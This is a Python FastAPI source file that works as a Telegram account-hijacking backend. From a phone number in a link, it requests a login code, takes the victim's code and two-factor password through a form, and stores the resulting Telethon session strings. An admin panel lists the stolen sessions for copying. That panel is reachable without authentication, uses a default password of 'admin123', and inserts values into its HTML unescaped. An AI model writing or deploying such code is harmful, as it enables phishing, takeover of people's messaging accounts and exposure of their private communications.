import os
import sqlite3
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
DB = "sessions.db"

# === DATABASE ===
def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("""
    CREATE TABLE IF NOT EXISTS pending (
        phone TEXT PRIMARY KEY,
        hash TEXT,
        time TEXT
    )
    """)
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
    conn.close()

if os.getenv("CLEAR_DB") == "1":
    if os.path.exists(DB): os.remove(DB)
    os.environ.pop("CLEAR_DB", None)

init_db()

def save_pending(phone: str, hash: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO pending (phone, hash, time) VALUES (?, ?, datetime('now'))", (phone, hash))
    conn.commit()
    conn.close()

def get_pending(phone: str):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT hash FROM pending WHERE phone = ?", (phone,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def delete_pending(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM pending WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

def save_session(phone: str, session: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
    conn.commit()
    conn.close()
    delete_pending(phone)

def delete_session(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

# === ROUTES ===
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    if not phone:
        raise HTTPException(400, "Phone required")
    delete_pending(phone)
    delete_session(phone)
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        save_pending(phone, sent.phone_code_hash)
        await client.disconnect()
        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(""), hash: str = Form("")):
    stored_hash = get_pending(phone)
    if not stored_hash or hash != stored_hash:
        return JSONResponse({"error": "Session expired or invalid hash. Try again."})

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        if pwd:
            await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
        else:
            await client.sign_in(phone, code, phone_code_hash=stored_hash)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except PhoneCodeInvalidError:
        return JSONResponse({"error": "Wrong code"})
    except Exception as e:
        return JSONResponse({"error": str(e)})
    finally:
        if client.is_connected():
            await client.disconnect()

# === ADMIN PANEL ===
@app.get("/admin")
async def admin_login():
    return HTMLResponse("""
    <form method="post" style="max-width:400px;margin:2rem auto;padding:1rem;">
      <h2>Admin Login</h2>
      <input type="password" name="password" placeholder="Password" required style="width:100%;padding:0.8rem;margin:0.5rem 0;border-radius:8px;">
      <button type="submit" style="width:100%;padding:0.8rem;background:#1a73e8;color:white;border:none;border-radius:8px;">Login</button>
    </form>
    """)

@app.post("/admin")
async def admin_check(password: str = Form(...)):
    if password != ADMIN_PASS:
        raise HTTPException(403, "Wrong password")
    return RedirectResponse("/admin/sessions", status_code=303)

@app.get("/admin/sessions", response_class=HTMLResponse)
async def admin_sessions():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
    rows = c.fetchall()
    conn.close()

    html = "<h2 style='text-align:center;'>Admin Panel</h2><ol style='max-width:600px;margin:auto;'>"
    for r in rows:
        html += f"""
        <li style='margin:1.5rem 0;padding:1rem;background:#f9f9f9;border-radius:10px;'>
            <b>Phone:</b> {r[0]}<br>
            <b>Time:</b> {r[2]}<br>
            <textarea style='width:100%;height:80px;font-family:monospace;margin:0.5rem 0;'>{r[1]}</textarea>
            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")' style='padding:0.5rem;background:#0f9d58;color:white;border:none;border-radius:6px;'>Copy</button>
            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;text-decoration:none;'>Delete</a>
        </li>
        """
    html += "</ol><div style='text-align:center;margin:2rem;'><a href='/admin'>← Logout</a></div>"
    return HTMLResponse(html)

@app.get("/admin/delete")
async def delete(phone: str):
    delete_session(phone)
    return RedirectResponse("/admin/sessions")
